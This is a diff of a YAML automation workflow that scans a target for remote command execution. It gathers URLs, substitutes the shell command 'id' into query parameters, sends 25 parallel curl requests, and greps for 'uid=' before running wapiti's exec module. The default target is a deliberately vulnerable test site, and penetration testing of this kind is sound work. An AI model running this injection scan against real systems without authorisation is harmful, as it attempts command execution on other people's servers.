@@ -2,20 +2,16 @@ description: Searches for RCE vulnerabilities by filtering gathered URLs with 'g
 tags: rce, security, bash, curl
 params: target=testphp.vulnweb.com header="Example:Blackdagger"
 # Change header without blank if you need or add authorization
-env:
-  - HOME: /root/
-  - LOG_DIR: ${HOME}/logs
-  - PATH: /usr/local/bin:${PATH}
 steps:
   - name: CustomRCE-External
     command: bash
     script: |
-      gau ${target//\"} | gf rce | sort -u | anew | httpx | qsreplace id | xargs -I % -P 25 sh -c 'curl -ks "%" 2>&1 | grep "uid=" && echo "RCE VULN! %" || true'
+      gau ${target} | gf rce | sort -u | anew | ~/go/bin/httpx | qsreplace id | xargs -I % -P 25 sh -c 'curl -ks "%" 2>&1 | grep "uid=" && echo "RCE VULN! %" || true'
   - name: CustomRCE-Internal
     command: bash
     script: |
-      httpx -u ${target//\"} | katana -H ${header//\"} qurl | gf rce | sort -u | anew | httpx -H ${header//\"} | qsreplace id | xargs -I % -P 25 sh -c 'curl -ks "%" 2>&1 | grep "uid=" && echo "RCE VULN! %" || true'
+      httpx -u ${target} | katana -H ${header} qurl | gf rce | sort -u | anew | httpx -H ${header} | qsreplace id | xargs -I % -P 25 sh -c 'curl -ks "%" 2>&1 | grep "uid=" && echo "RCE VULN! %" || true'
   - name: AutoRCE
     command: bash
     script: |
-      httpx -u $target -o resRCE_${target//\"}.txt ; wapiti -u "$(cat resRCE_${target//\"}.txt)" -m exec -H ${header//\"}
+      httpx -u $target -o resRCE_${target}.txt ; wapiti -u "$(cat resRCE_${target}.txt)" -m exec -H ${header}
